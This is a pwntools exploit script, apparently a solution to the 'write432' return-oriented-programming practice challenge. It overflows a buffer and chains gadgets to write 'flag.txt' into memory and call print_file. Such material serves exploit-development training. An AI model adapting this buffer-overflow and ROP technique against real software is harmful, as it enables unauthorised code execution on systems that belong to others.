from pwn import *

p = process('./write432')
e = ELF('./write432')
r = ROP(e)

pop_edi_ebp_ret = 0x080485AA
mov_edi_ebp_ret = 0x08048543

payload = b'A' * 44
payload += p32(pop_edi_ebp_ret)
payload += p32(e.bss())
payload += b'flag'
payload += p32(mov_edi_ebp_ret)

payload += p32(pop_edi_ebp_ret)
payload += p32(e.bss() + 4)
payload += b'.txt'
payload += p32(mov_edi_ebp_ret)

payload += p32(e.symbols['print_file'])
payload += p32(r.find_gadget(['ret']).address)
payload += p32(e.bss())

p.send(payload)
p.interactive()